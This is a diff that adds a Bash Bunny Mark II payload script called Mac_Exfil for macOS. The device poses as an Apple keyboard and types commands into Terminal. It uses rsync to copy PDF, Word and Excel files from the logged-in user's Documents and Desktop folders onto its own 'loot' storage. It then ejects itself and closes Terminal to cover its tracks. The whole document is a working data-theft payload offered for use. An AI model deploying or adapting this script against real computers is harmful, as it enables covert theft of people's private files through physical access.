@@ -1,0 +1,45 @@
+#!/bin/bash
+
+# Title: Mac_Exfil
+# Description: Exfiltrates files from logged in users Documents and Desktop folders
+# Author: Carey Balboa - Mac Help Nashville, Inc. with assistance from corydon76 props to Nashville 2600
+# Target: macOS
+# Dependencies: none
+#
+# Format your MicroSD XC card for your Bash Bunny Mark II using FAT32 and name it "BUNNY" containing a folder named "loot"
+LED SETUP
+ATTACKMODE HID STORAGE VID_0x05AC PID_0x0267
+QUACK GUI SPACE
+QUACK DELAY 500
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 1000
+LED STAGE1
+QUACK STRING "rsync -av --max-size=5.0m --include='*.pdf' --include='*.docx' --include='*.xlsx' --exclude='*' ~/Documents/ ~/Desktop/ /Volumes/BUNNY/loot"
+QUACK ENTER
+QUACK DELAY 2000
+# Sync filesystem 
+# By default, the Linux kernel writes data to disk asynchronously.
+# Writes are buffered (cached) in memory, and written to the storage device at the optimal time.
+# The sync command forces an immediate write of all cached data to disk.
+# Run sync if you anticipate the system to be unstable, or the storage device to become suddenly unavailable, 
+# and you want to ensure all data is written to disk. (WE ARE ABOUT TO EJECT IT)
+sync
+QUACK DELAY 2000
+LED STAGE2
+QUACK STRING "diskutil eject BUNNY && killall Terminal"
+QUACK ENTER
+QUACK DELAY 1000
+LED STAGE3
+# LED payload complete
+LED W FAST
+mount /dev/mmcblk0p1 /mnt
+files=$(find /mnt/loot -type f | wc -l)
+# debug=$(find /mnt/loot -type f)
+# DEBUG "switch-1-debug" "$files:$debug"
+umount /mnt
+if [ "$files" != "0" ]; then
+LED FINISH
+else
+LED FAIL
+fi
